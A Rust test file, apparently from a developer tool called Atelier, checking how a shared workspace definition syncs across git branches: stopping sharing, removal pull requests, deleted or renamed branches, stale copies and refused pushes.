/// another project's `.atelier/workspace.json` — "sandbox monorepo".
fn on_int_with_another_on_main() -> (Fixture, FakeRepo) {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    let named = PLY_DEFINITION.replace("\"name\": \"Ply\",", "\"name\": \"Ply\",\n  \"integrationBranch\": \"w1175-int\",");
    repo.put("main", DEFINITION_PATH, &named, "a", "c1");
    repo.put("w1175-int", DEFINITION_PATH, &named, "a", "c1");
    fx.refresh(&repo);
    fx.refresh(&repo);
    assert_eq!(fx.cache().unwrap().branch.as_deref(), Some("w1175-int"));
    repo.put("main", DEFINITION_PATH, &another_project(), "sandbox-owner", "m1");
    fx.refresh(&repo);
    assert_ours(&fx);
    (fx, repo)
}

fn another_project() -> String {
    PLY_DEFINITION.replace("\"name\": \"Ply\",", "\"name\": \"sandbox monorepo\",")
}

/// Nothing of "sandbox monorepo" reached this project.
fn assert_ours(fx: &Fixture) {
    let cache = fx.cache().unwrap();
    assert_ne!(cache.branch.as_deref(), Some("main"), "never read from main");
    assert!(cache.definition.as_ref().is_none_or(|d| d.name != "sandbox monorepo"), "{:?}", cache.definition);
    assert_ne!(fx.ws().name, "sandbox monorepo");
}

#[test]
fn walkfix_stop_sharing_on_a_free_branch_never_adopts_main_and_stays_stopped() {
    let (fx, repo) = on_int_with_another_on_main();
    let outcome = stop(&fx.stores(), &FakeRemover::default(), &FakePublisher::default(), &fx.ws_id, 5).unwrap();
    assert_eq!(outcome, StopOutcome::Stopped { branch: "w1175-int".into(), closed: vec![], left_open: vec![] });
    repo.remove_by("w1175-int", DEFINITION_PATH, "test-owner", "c2");
    for _ in 0..2 {
        fx.refresh(&repo);
        assert_ours(&fx);
        let cache = fx.cache().unwrap();
        assert!(cache.definition.is_none() && cache.removed.is_none());
        assert_eq!(cache.sharing.unwrap().state, SharingState::StoppedHere, "still stopped, not 'shared again'");
    }
}

#[test]
fn walkfix_stop_sharing_through_a_pull_request_that_merged_says_stopped_and_closes_this_computers_pull_requests() {
    let (fx, repo) = on_int_with_another_on_main();
    following(&fx);
    let publisher = FakePublisher::default();
    for n in [12, 15, 18, 231] {
        publisher.pr_states.borrow_mut().insert(n, PrState::Open);
    }
    stop(&fx.stores(), &FakeRemover::then(RemovalOutcome::PullRequest(removal_pr(231))), &publisher, &fx.ws_id, 7).unwrap();
    publisher.pr_states.borrow_mut().insert(231, PrState::Merged);
    repo.remove_by("w1175-int", DEFINITION_PATH, "example-teammate", "c2");
    let report = refresh_and_publish(&fx.stores(), &repo, &publisher, &fx.ws_id, RefreshMoment::Periodic).unwrap();
    assert_eq!(
        report.sharing,
        Some(SharingNote::Stopped { branch: "w1175-int".into(), closed: vec![12, 15, 18], left_open: vec![] })
    );
    assert_eq!(*publisher.closed.borrow(), vec![12, 15, 18]);
    assert_ours(&fx);
    assert!(publisher.requests.borrow().is_empty(), "nothing published onto main");
}

#[test]
fn walkfix_a_setup_removed_by_hand_says_removed_and_main_is_not_adopted() {
    let (fx, repo) = on_int_with_another_on_main();
    repo.remove_by("w1175-int", DEFINITION_PATH, "example-teammate", "c2");
    for _ in 0..2 {
        fx.refresh(&repo);
        assert_ours(&fx);
        let cache = fx.cache().unwrap();
        assert_eq!(cache.removed.as_ref().map(|r| r.branch.as_str()), Some("w1175-int"), "the notice, not main's file");
        assert!(cache.definition.is_none());
    }
    // Keep it on this Mac: still nothing from main.
    crate::stop_sharing::keep_local(&fx.stores(), &fx.ws_id, 9).unwrap();
    fx.refresh(&repo);
    assert_ours(&fx);
    assert_eq!(fx.cache().unwrap().sharing.unwrap().state, SharingState::KeptLocal);
}

#[test]
fn walkfix_the_cards_branch_deleted_says_so_and_main_is_not_adopted() {
    let (fx, repo) = on_int_with_another_on_main();
    repo.remove("w1175-int", DEFINITION_PATH);
    repo.gone.borrow_mut().insert("w1175-int".into());
    for _ in 0..2 {
        fx.refresh(&repo);
        assert_ours(&fx);
        let cache = fx.cache().unwrap();
        assert_eq!(cache.branch_gone, Some(BranchGone { branch: "w1175-int".into(), renamed_to: None }));
        assert_eq!(cache.definition.as_ref().map(|d| d.name.as_str()), Some("Ply"), "the copy in use stays");
        assert!(cache.removed.is_none());
    }
}

#[test]
fn walkfix_shared_again_on_its_own_branch_is_read_and_the_state_clears() {
    let (fx, repo) = on_int_with_another_on_main();
    stop(&fx.stores(), &FakeRemover::default(), &FakePublisher::default(), &fx.ws_id, 5).unwrap();
    repo.remove_by("w1175-int", DEFINITION_PATH, "test-owner", "c2");
    fx.refresh(&repo);
    let named = PLY_DEFINITION.replace("\"name\": \"Ply\",", "\"name\": \"Ply\",\n  \"integrationBranch\": \"w1175-int\",");
    repo.put("w1175-int", DEFINITION_PATH, &named, "example-teammate", "c3");
    fx.refresh(&repo);
    let cache = fx.cache().unwrap();
    assert_eq!(cache.branch.as_deref(), Some("w1175-int"));
    assert!(cache.sharing.is_none() && cache.removed.is_none(), "back on its own branch: shared again");
}

/// Where the line is: a project that never had a setup still takes the
/// default branch's file at its first read.
#[test]
fn walkfix_a_project_that_never_had_a_setup_still_adopts_the_default_branchs_file() {
    assert_eq!(crate::stop_sharing::own_branches(None, "main"), None);
    assert_eq!(crate::stop_sharing::own_branches(Some(&DefinitionCache::empty()), "main"), None);
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, &another_project(), "sandbox-owner", "m1");
    fx.refresh(&repo);
    assert_eq!(fx.cache().unwrap().definition.unwrap().name, "sandbox monorepo");
}

/// WALKFIX-1 (walk): a page read settles the removal's pull request that
/// GitHub says merged — the toast comes now, not at the ten-minute read —
/// and closes nothing on GitHub; the next read that isn't a page's does.
#[test]
fn walkfix_a_page_read_settles_a_merged_removal_and_writes_nothing_to_github() {
    let (fx, repo) = on_int_with_another_on_main();
    following(&fx);
    let publisher = FakePublisher::default();
    for n in [12, 15, 18, 231] {
        publisher.pr_states.borrow_mut().insert(n, PrState::Open);
    }
    stop(&fx.stores(), &FakeRemover::then(RemovalOutcome::PullRequest(removal_pr(231))), &publisher, &fx.ws_id, 7).unwrap();
    publisher.pr_states.borrow_mut().insert(231, PrState::Merged);
    repo.remove_by("w1175-int", DEFINITION_PATH, "example-teammate", "c2");
    let report = read_at_moment(&fx.stores(), &repo, &publisher, &fx.ws_id, RefreshMoment::PageRead).unwrap();
    assert!(publisher.closed.borrow().is_empty(), "a page read closes nothing");
    assert!(publisher.requests.borrow().is_empty(), "and publishes nothing");
    assert_eq!(fx.cache().unwrap().sharing.unwrap().state, SharingState::StoppedHere);
    assert_ours(&fx);
    let _ = report;
    // The next read that may write closes them and says so.
    let report = refresh_and_publish(&fx.stores(), &repo, &publisher, &fx.ws_id, RefreshMoment::Periodic).unwrap();
    assert_eq!(*publisher.closed.borrow(), vec![12, 15, 18]);
    assert!(matches!(report.sharing, Some(SharingNote::Stopped { .. })));

    // Closed without merging: said at the page read itself.
    let (fx, repo) = on_int_with_another_on_main();
    let publisher = FakePublisher::default();
    publisher.pr_states.borrow_mut().insert(231, PrState::Open);
    stop(&fx.stores(), &FakeRemover::then(RemovalOutcome::PullRequest(removal_pr(231))), &publisher, &fx.ws_id, 7).unwrap();
    publisher.pr_states.borrow_mut().insert(231, PrState::Closed);
    let report = read_at_moment(&fx.stores(), &repo, &publisher, &fx.ws_id, RefreshMoment::PageRead).unwrap();
    assert_eq!(report.sharing, Some(SharingNote::RemovalClosed { number: 231 }));
}

/// WALKFIX-1 round 2 (review): while this project's branch is gone, another
/// branch's file is never adopted by itself — not even one naming that
/// branch (another project of the same repository can). C5's notice shows,
/// and *Move to {new}* still moves it.
#[test]
fn walkfix_r2_a_file_naming_the_gone_branch_is_not_adopted_and_c5_still_moves() {
    let (fx, repo) = on_int_with_another_on_main();
    let impostor = another_project().replace(
        "\"name\": \"sandbox monorepo\",",
        "\"name\": \"sandbox monorepo\",\n  \"integrationBranch\": \"w1175-int\",",
    );
    assert!(impostor.contains("w1175-int"));
    repo.put("main", DEFINITION_PATH, &impostor, "sandbox-owner", "m2");
    repo.remove("w1175-int", DEFINITION_PATH);
    repo.gone.borrow_mut().insert("w1175-int".into());
    for _ in 0..2 {
        fx.refresh(&repo);
        assert_ours(&fx);
        let cache = fx.cache().unwrap();
        assert_eq!(cache.branch_gone, Some(BranchGone { branch: "w1175-int".into(), renamed_to: None }));
        assert_eq!(cache.definition.as_ref().map(|d| d.name.as_str()), Some("Ply"));
    }
    // Renamed instead: the C5 flow still moves it there.
    let (fx, repo) = on_int_with_another_on_main();
    rename(&repo, "w1175-int", "w1175-next");
    fx.refresh(&repo);
    assert_eq!(
        fx.cache().unwrap().branch_gone,
        Some(BranchGone { branch: "w1175-int".into(), renamed_to: Some("w1175-next".into()) })
    );
    crate::move_shared_setup::move_to_renamed(&fx.stores(), &repo, &fx.ws_id, "w1175-next").unwrap();
    let publisher = FakePublisher::default();
    publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap().unwrap();
    assert_eq!(publisher.requests.borrow()[0].0, "w1175-next");
    let moved = std::str::from_utf8(&repo.read("w1175-next", DEFINITION_PATH).unwrap().bytes).unwrap().replace("w1175-int", "w1175-next");
    repo.put("w1175-next", DEFINITION_PATH, &moved, "a", "c3");
    fx.refresh(&repo);
    let cache = fx.cache().unwrap();
    assert_eq!(cache.branch.as_deref(), Some("w1175-next"));
    assert!(cache.branch_gone.is_none());
    assert_ours(&fx);
}

// ── WALKFIX-3 (re-run of the sharing walk) ─────────────────────────────

/// Item 1: *Share it again* shares this Mac's board as it is — a Local
/// project stays Local, and its cards never become issues by themselves.
/// The first Share still puts the board on GitHub Issues (its question says so).
#[test]
fn walkfix3_share_it_again_keeps_a_local_board_local() {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    let local = PLY_DEFINITION.replace("\"board\": \"githubIssues\",", "\"board\": \"local\",");
    repo.put("main", DEFINITION_PATH, &local, "example-teammate", "c1");
    fx.refresh(&repo);
    assert_eq!(fx.ws().kanban_sync_mode, KanbanSyncMode::Local);
    stop(&fx.stores(), &FakeRemover::default(), &FakePublisher::default(), &fx.ws_id, 5).unwrap();
    repo.remove_by("main", DEFINITION_PATH, "test-owner", "c2");
    fx.refresh(&repo);
    let outcome = crate::workspace_adoption::share(&fx.stores(), &repo, &fx.ws_id, "MatteoB-adv/atelier", 3).unwrap();
    assert_eq!(outcome.board, KanbanSyncMode::Local, "not moved to GitHub Issues");
    let def = fx.cache().unwrap().definition.unwrap();
    assert_eq!(def.board, KanbanSyncMode::Local);
    assert_eq!(def.github_owner_repo, None);
    assert_eq!(fx.ws().kanban_sync_mode, KanbanSyncMode::Local);
    // Kept here after a removal: the same.
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, &local, "example-teammate", "c1");
    fx.refresh(&repo);
    repo.remove_by("main", DEFINITION_PATH, "example-teammate", "c2");
    fx.refresh(&repo);
    keep_local(&fx.stores(), &fx.ws_id, 1).unwrap();
    crate::workspace_adoption::share(&fx.stores(), &repo, &fx.ws_id, "MatteoB-adv/atelier", 0).unwrap();
    assert_eq!(fx.cache().unwrap().definition.unwrap().board, KanbanSyncMode::Local);
    assert_eq!(fx.ws().kanban_sync_mode, KanbanSyncMode::Local);
}

// ── Owner, 2026-11-10: "{who} shared this project's setup again" ───────

#[test]
fn owner_a_a_teammate_kept_here_is_told_once_when_the_setup_is_shared_again() {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    let local = PLY_DEFINITION.replace("\"board\": \"githubIssues\",", "\"board\": \"local\",");
    repo.put("main", DEFINITION_PATH, &local, "example-teammate", "c1");
    fx.refresh(&repo);
    repo.remove_by("main", DEFINITION_PATH, "example-teammate", "c2");
    fx.refresh(&repo);
    keep_local(&fx.stores(), &fx.ws_id, 1).unwrap();
    assert_eq!(fx.ws().kanban_sync_mode, KanbanSyncMode::Local);
    // giulia shares it again, with the board on GitHub Issues.
    repo.put("main", DEFINITION_PATH, PLY_DEFINITION, "example-teammate", "c3");
    let report = fx.refresh(&repo);
    assert_eq!(
        report.sharing,
        Some(SharingNote::SharedAgain { who: Some("example-teammate".into()), board: Some(KanbanSyncMode::GitHubIssues) })
    );
    // Once.
    assert_eq!(fx.refresh(&repo).sharing, None);

    // The same board: no board line.
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, &local, "example-teammate", "c1");
    fx.refresh(&repo);
    repo.remove_by("main", DEFINITION_PATH, "example-teammate", "c2");
    fx.refresh(&repo);
    repo.put("main", DEFINITION_PATH, &local, "example-teammate", "c3");
    assert_eq!(
        fx.refresh(&repo).sharing,
        Some(SharingNote::SharedAgain { who: Some("example-teammate".into()), board: None })
    );
}

#[test]
fn owner_a_the_sharers_own_computer_is_never_told_it_shared_again() {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    let local = PLY_DEFINITION.replace("\"board\": \"githubIssues\",", "\"board\": \"local\",");
    repo.put("main", DEFINITION_PATH, &local, "test-owner", "c1");
    fx.refresh(&repo);
    stop(&fx.stores(), &FakeRemover::default(), &FakePublisher::default(), &fx.ws_id, 5).unwrap();
    repo.remove_by("main", DEFINITION_PATH, "test-owner", "c2");
    fx.refresh(&repo);
    crate::workspace_adoption::share(&fx.stores(), &repo, &fx.ws_id, "MatteoB-adv/atelier", 0).unwrap();
    // Its creation lands on the branch; this computer reads it back.
    repo.put("main", DEFINITION_PATH, &local, "test-owner", "c3");
    let report = fx.refresh(&repo);
    assert_eq!(report.sharing, None);
    assert_eq!(fx.refresh(&repo).sharing, None);
}

/// Windows walk: a page read settles a conversion's pull request closed
/// without merging — the toast and the row no longer wait for the next
/// ten-minute read — and writes nothing to GitHub.
#[test]
fn winfix_a_page_read_settles_a_conversion_closed_without_merging() {
    let (fx, repo, publisher) = conversion_waiting();
    let asked_before = publisher.requests.borrow().len();
    publisher.pr_states.borrow_mut().insert(214, PrState::Closed);
    let report = read_at_moment(&fx.stores(), &repo, &publisher, &fx.ws_id, RefreshMoment::PageRead).unwrap();
    let publish = report.publish.expect("said at the page read");
    assert_eq!(publish.closed_pull_requests, vec![214]);
    assert_eq!(publish.conversion_declined, Some(214));
    assert!(fx.cache().unwrap().conversion_declined.is_some());
    assert!(fx.queue().create_pull_request.is_none());
    assert_eq!(publisher.requests.borrow().len(), asked_before, "nothing published");
    assert!(publisher.closed.borrow().is_empty(), "nothing closed on GitHub");
    // Still open: nothing changes, nothing said.
    let (fx, repo, publisher) = conversion_waiting();
    publisher.pr_states.borrow_mut().insert(214, PrState::Open);
    let report = read_at_moment(&fx.stores(), &repo, &publisher, &fx.ws_id, RefreshMoment::PageRead).unwrap();
    assert!(report.publish.is_none());
    assert_eq!(fx.queue().create_pull_request.as_ref().map(|p| p.number), Some(214));
}

/// winfix follow-up: a page read holds the workspace lock while it asks
/// GitHub — at most five pull requests, and none after one with no answer.
#[test]
fn winfix_a_page_read_asks_of_five_pull_requests_at_most_and_stops_at_no_answer() {
    let (fx, repo) = shared();
    let mut queue = fx.queue();
    for n in 1..=7u64 {
        let mut f = queue_field(Value::from("x"));
        f.pull_request = Some(removal_pr(100 + n));
        queue.fields.insert(format!("field{n}"), f);
    }
    save_queue(&fx.configs, &fx.ws_id, &queue).unwrap();
    // Offline: GitHub answers nothing — one ask, then none.
    let publisher = FakePublisher::default();
    read_at_moment(&fx.stores(), &repo, &publisher, &fx.ws_id, RefreshMoment::PageRead).unwrap();
    assert_eq!(publisher.state_asks.borrow().len(), 1);
    // Every one open: five asks, not seven.
    let publisher = FakePublisher::default();
    for n in 1..=7u64 {
        publisher.pr_states.borrow_mut().insert(100 + n, PrState::Open);
    }
    read_at_moment(&fx.stores(), &repo, &publisher, &fx.ws_id, RefreshMoment::PageRead).unwrap();
    assert_eq!(publisher.state_asks.borrow().len(), 5);
    // The drain still asks of every one.
    let publisher = FakePublisher::default();
    for n in 1..=7u64 {
        publisher.pr_states.borrow_mut().insert(100 + n, PrState::Open);
    }
    publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap();
    assert!(publisher.state_asks.borrow().len() >= 7);
}

// ── Two-instance walk (teamfix) ─────────────────────────────────────────

/// C4: whether the creation pull request is open is what GitHub said at the
/// last read that asked — kept for the page, cleared once it merged.
#[test]
fn teamfix_c4_the_creation_pull_requests_state_is_kept_as_github_said_it() {
    let (fx, repo) = shared();
    let mut queue = fx.queue();
    queue.create_pull_request = Some(removal_pr(215));
    save_queue(&fx.configs, &fx.ws_id, &queue).unwrap();
    // A queue 1.174.5 wrote has no such field: unknown, never "open".
    let raw = std::fs::read_to_string(crate::shared_config::queue_path(&fx.configs, &fx.ws_id)).unwrap();
    assert!(!raw.contains("creationOpen"));
    assert_eq!(fx.queue().creation_open, None);
    let publisher = FakePublisher::default();
    publisher.pr_states.borrow_mut().insert(215, PrState::Open);
    read_at_moment(&fx.stores(), &repo, &publisher, &fx.ws_id, RefreshMoment::PageRead).unwrap();
    assert_eq!(fx.queue().creation_open, Some(215), "somebody else's share is on the branch");
    // GitHub can't say: what was known stays.
    let silent = FakePublisher::default();
    read_at_moment(&fx.stores(), &repo, &silent, &fx.ws_id, RefreshMoment::PageRead).unwrap();
    assert_eq!(fx.queue().creation_open, Some(215));
    // The winner's own pull request merged: settled, nothing "isn't needed".
    publisher.pr_states.borrow_mut().insert(215, PrState::Merged);
    read_at_moment(&fx.stores(), &repo, &publisher, &fx.ws_id, RefreshMoment::PageRead).unwrap();
    let queue = fx.queue();
    assert!(queue.create_pull_request.is_none() && queue.creation_open.is_none());
}

/// C5: the owner renames the cards' branch on GitHub and presses *Move to
/// develop*; the teammate's computer follows it there — the same branch
/// under its new name — and the gone notice clears.
#[test]
fn teamfix_c5_a_teammate_follows_move_to_after_a_rename() {
    let repo = FakeRepo::new();
    let named = PLY_DEFINITION.replace("\"name\": \"Ply\",", "\"name\": \"Ply\",\n  \"integrationBranch\": \"staging\",");
    repo.put("main", DEFINITION_PATH, &named, "a", "c1");
    repo.put("staging", DEFINITION_PATH, &named, "a", "c1");
    let owner = Fixture::new();
    let mate = Fixture::new();
    for fx in [&owner, &mate] {
        fx.refresh(&repo);
        fx.refresh(&repo);
        assert_eq!(fx.cache().unwrap().branch.as_deref(), Some("staging"));
    }
    rename(&repo, "staging", "develop");
    for fx in [&owner, &mate] {
        fx.refresh(&repo);
        assert_eq!(
            fx.cache().unwrap().branch_gone,
            Some(BranchGone { branch: "staging".into(), renamed_to: Some("develop".into()) })
        );
    }
    // The owner moves it: the file on develop now names develop.
    crate::move_shared_setup::move_to_renamed(&owner.stores(), &repo, &owner.ws_id, "develop").unwrap();
    let moved = named.replace("\"staging\"", "\"develop\"");
    repo.put("develop", DEFINITION_PATH, &moved, "test-owner", "c2");
    // The teammate's next read follows.
    mate.refresh(&repo);
    let cache = mate.cache().unwrap();
    assert_eq!(cache.branch.as_deref(), Some("develop"));
    assert!(cache.branch_gone.is_none(), "the notice goes");
    assert_eq!(cache.definition.unwrap().integration_branch.as_deref(), Some("develop"));
    // Another branch is still never taken: `main`'s copy wasn't.
    assert_ne!(cache_branch(&mate), Some("main".into()));
}

fn cache_branch(fx: &Fixture) -> Option<String> {
    fx.cache().and_then(|c| c.branch)
}

/// C5: a push refused for access (HTTP 403) is GitHub's no-push: the drain
/// stops retrying it at every Sync, and the page offers the team's values.
#[test]
fn teamfix_c5_a_push_refused_for_access_stops_the_retries() {
    let (fx, repo) = shared();
    fx.workspaces.set_accent_color(&fx.ws_id, Some("#0ea5e9".into())).unwrap();
    record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).unwrap().unwrap();
    let refused = format!(
        "main {} (remote: Permission to MatteoB-adv/atelier.git denied to example-teammate. fatal: unable to access: The requested URL returned error: 403)",
        crate::shared_config::REFUSED_MARKER
    );
    let publisher = FakePublisher::default().then(PublishOutcome::Failed(refused));
    publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap();
    let cache = fx.cache().unwrap();
    assert!(cache.write_access.read_only());
    // The next Sync tries nothing.
    let again = FakePublisher::default();
    assert!(publish_pending(&fx.stores(), &repo, &again, &fx.ws_id).unwrap().is_none());
    assert!(again.requests.borrow().is_empty());
    // A branch rule's refusal isn't an access one, nor a bare number.
    assert!(!refused_for_access("main refused the push (protected branch hook declined)"));
    assert!(!refused_for_access("main refused the push: pull request #403 is in the way"));
    // Round 2: where GitHub can't say (no `gh`), the person's Sync or
    // Publish press tries once more.
    let pressed = FakePublisher::default();
    publish_pending_at(&fx.stores(), &repo, &pressed, &fx.ws_id, true).unwrap();
    assert_eq!(pressed.requests.borrow().len(), 1);
}

/// C3 (owner, 2026-11-10): "Cards go to" moved to a branch that holds an
/// older copy. A teammate never takes that copy as newer: it keeps the copy
/// that points there until the moved one is on that branch.
#[test]
fn teamfix_c3_a_stale_copy_on_the_new_branch_is_never_taken_as_newer() {
    let repo = FakeRepo::new();
    let on = |b: &str| PLY_DEFINITION.replace("\"name\": \"Ply\",", &format!("\"name\": \"Ply\",\n  \"integrationBranch\": \"{b}\","));
    repo.put_at("main", &on("w1175-int"), "a", "c0", 100);
    repo.put_at("w1175-int", &on("w1175-int"), "a", "c1", 100);
    // An old setup left on w1175-third.
    let stale = on("w1175-third").replace("\"name\": \"Ply\"", "\"name\": \"stale\"").replace("ppvp.sh", "old.sh");
    repo.put_at("w1175-third", &stale, "z", "c-old", 50);
    let mate = Fixture::new();
    mate.refresh(&repo);
    mate.refresh(&repo);
    assert_eq!(mate.cache().unwrap().branch.as_deref(), Some("w1175-int"));
    // The owner's change lands on w1175-int (the pointer), then the move.
    repo.put_at("w1175-int", &on("w1175-third"), "test-owner", "c2", 200);
    for _ in 0..2 {
        mate.refresh(&repo);
        let cache = mate.cache().unwrap();
        let def = cache.definition.unwrap();
        assert_eq!(def.name, "Ply", "never the older copy's values");
        assert_ne!(cache.branch.as_deref(), Some("w1175-third"));
    }
    repo.put_at("w1175-third", &on("w1175-third"), "test-owner", "c3", 201);
    mate.refresh(&repo);
    let cache = mate.cache().unwrap();
    assert_eq!(cache.branch.as_deref(), Some("w1175-third"));
    assert_eq!(cache.definition.unwrap().name, "Ply");
}

/// C3 (owner): publishing a changed "Cards go to" moves the setup there,
/// carrying the current values.
#[test]
fn teamfix_c3_publishing_cards_go_to_moves_the_setup_with_the_current_values() {
    let (fx, repo) = shared();
    repo.branches.borrow_mut().insert("release".into());
    let latest = get_view(&fx.stores(), &repo, &fx.ws_id).unwrap().effective.unwrap();
    let base = to_map(&latest);
    let mut draft = base.clone();
    draft.insert("integrationBranch".into(), Value::from("release"));
    save_changes(&fx.stores(), &repo, &fx.ws_id, base, draft).unwrap();
    let publisher = FakePublisher::default();
    publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap().unwrap();
    let requests = publisher.requests.borrow();
    assert_eq!(requests[0].0, "main", "the change lands where it is read");
    let moved = requests.iter().find(|(b, _, _)| b == "release").expect("then the move");
    let whole = moved.2.as_ref().expect("written whole");
    assert_eq!(whole.name, "Ply");
    assert_eq!(whole.integration_branch.as_deref(), Some("release"));
}

/// teamfix round 2 (C3): a copy on the new branch newer than the one moved
/// is never replaced — the differing fields are asked about instead; and a
/// move that doesn't land opens no pull request and is left to the next
/// publish, said in the bar.
#[test]
fn teamfix_r2_a_newer_copy_on_the_new_branch_is_not_replaced() {
    let (fx, repo) = shared();
    repo.branches.borrow_mut().insert("release".into());
    // release holds a copy committed after this computer's (time 1_700_000_900).
    let newer = PLY_DEFINITION.replace("\"name\": \"Ply\",", "\"name\": \"Ply newer\",");
    repo.put_at("release", &newer, "example-teammate", "c-new", 1_800_000_000);
    let latest = get_view(&fx.stores(), &repo, &fx.ws_id).unwrap().effective.unwrap();
    let base = to_map(&latest);
    let mut draft = base.clone();
    draft.insert("integrationBranch".into(), Value::from("release"));
    save_changes(&fx.stores(), &repo, &fx.ws_id, base, draft).unwrap();
    let publisher = FakePublisher::default();
    publisher.outcomes.borrow_mut().push(pointer_landed());
    // The pointer's commit time, for the fake (it has no history).
    repo.put_at("times", PLY_DEFINITION, "test-owner", "c-pointer", 1_700_000_900);
    publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap().unwrap();
    let requests = publisher.requests.borrow();
    assert!(requests.iter().all(|(b, _, _)| b != "release"), "nothing written onto the newer copy");
    // The name differs: queued to be asked about at the next publish there.
    let queue = fx.queue();
    assert_eq!(queue.fields.get("name").map(|f| f.base.clone()), Some(Value::from("Ply")), "measured against this Mac's: the question comes");
}

#[test]
fn teamfix_r2_a_move_that_doesnt_land_opens_no_pull_request_and_is_left_for_the_next_publish() {
    let (fx, repo) = shared();
    repo.branches.borrow_mut().insert("release".into());
    let older = PLY_DEFINITION.replace("\"name\": \"Ply\",", "\"name\": \"Ply older\",");
    repo.put_at("release", &older, "z", "c-old", 1);
    let latest = get_view(&fx.stores(), &repo, &fx.ws_id).unwrap().effective.unwrap();
    let base = to_map(&latest);
    let mut draft = base.clone();
    draft.insert("integrationBranch".into(), Value::from("release"));
    save_changes(&fx.stores(), &repo, &fx.ws_id, base, draft).unwrap();
    // The pointer lands; the move is refused.
    let publisher = FakePublisher::default();
    publisher.outcomes.borrow_mut().push(pointer_landed());
    repo.put_at("times", PLY_DEFINITION, "test-owner", "c-pointer", 1_700_000_900);
    publisher.outcomes.borrow_mut().push(PublishOutcome::Failed("release refused the move (protected)".into()));
    publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap().unwrap();
    let requests = publisher.requests.borrow();
    assert_eq!(requests.len(), 2);
    assert_eq!(requests[1].0, "release");
    let queue = fx.queue();
    assert!(queue.last_error.as_deref().is_some_and(|e| e.contains("refused the move")), "said in the bar");
    let name = queue.fields.get("name").expect("left for the next publish");
    assert_eq!(name.base, Value::from("Ply older"), "measured against the branch's: it goes without a question");
    assert!(queue.create_pull_request.is_none());
}

/// The change of "Cards go to" landing on `main` as `c-pointer`.
fn pointer_landed() -> PublishOutcome {
    PublishOutcome::Published {
        commit: "c-pointer".into(),
        definition: parse_definition(
            PLY_DEFINITION.replace("\"name\": \"Ply\",", "\"name\": \"Ply\",\n  \"integrationBranch\": \"release\",").as_bytes(),
        )
        .unwrap(),
        author: None,
        fields: vec!["integrationBranch".into()],
        overrides: Vec::new(),
        pushed: true,
        conflicts: Default::default(),
    }
}

/// teamfix round 2: the move never creates the file on a branch whose
/// history removed it.
#[test]
fn teamfix_r2_the_move_never_creates_the_file_where_it_was_removed() {
    let (fx, repo) = shared();
    repo.branches.borrow_mut().insert("release".into());
    *repo.deleted.borrow_mut() = Some(Deletion::Deleted("c0".into(), None, None));
    let latest = get_view(&fx.stores(), &repo, &fx.ws_id).unwrap().effective.unwrap();
    let base = to_map(&latest);
    let mut draft = base.clone();
    draft.insert("integrationBranch".into(), Value::from("release"));
    save_changes(&fx.stores(), &repo, &fx.ws_id, base, draft).unwrap();
    let publisher = FakePublisher::default();
    publisher.outcomes.borrow_mut().push(pointer_landed());
    publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap().unwrap();
    assert!(publisher.requests.borrow().iter().all(|(b, _, _)| b != "release"));
}

/// F3 walk: "Where cards go" on a GitLab project said "Git couldn't sign in
/// to GitHub". The branch read carries a non-GitHub origin's host, and only
/// that one.
#[test]
fn the_branch_read_names_an_origin_that_isnt_on_github() {
    let dir = tempfile::tempdir().unwrap();
    let git = |args: &[&str]| {
        assert!(crate::platform::git_command().current_dir(dir.path()).args(args).output().unwrap().status.success(), "{args:?}");
    };
    git(&["init", "-q"]);
    assert_eq!(origin_host_elsewhere(dir.path()), None, "no origin");
    git(&["remote", "add", "origin", "git@gitlab.com:acme/lyra.git"]);
    assert_eq!(origin_host_elsewhere(dir.path()).as_deref(), Some("gitlab.com"));
    git(&["remote", "set-url", "origin", "https://github.com/acme/lyra.git"]);
    assert_eq!(origin_host_elsewhere(dir.path()), None, "GitHub: the GitHub words");
    // A local path: the generic sentence, never "from this computer".
    git(&["remote", "set-url", "origin", "/srv/git/lyra.git"]);
    assert_eq!(origin_host_elsewhere(dir.path()), None, "a local path");
}
